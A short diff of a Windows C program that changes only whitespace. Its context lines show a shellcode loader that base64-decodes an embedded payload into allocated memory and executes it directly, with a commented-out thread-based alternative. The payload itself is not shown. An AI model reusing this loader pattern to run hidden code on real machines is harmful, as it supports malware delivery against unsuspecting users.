@@ -15,7 +15,7 @@ int main(void) {
         printf("Failed to allocate memory (%u)\n", GetLastError());
         return -1;
     }
-    
+
     // base64 decoding
     if (!CryptStringToBinaryA(payload, payloadLen, CRYPT_STRING_BASE64, (BYTE*)alloc_mem, &payloadLen, NULL, NULL)) {
         printf("Failed to decode the payload(%u)\n", GetLastError());
@@ -31,7 +31,7 @@ int main(void) {
 
     ((void(*)())alloc_mem)();
 
-    
+
     /*
     HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
 	if (!tHandle) {
@@ -39,9 +39,9 @@ int main(void) {
 		return -3;
 	}
 
-	WaitForSingleObject(tHandle, INFINITE); 
+	WaitForSingleObject(tHandle, INFINITE);
     */
-    
+
 
     return 0;
 }
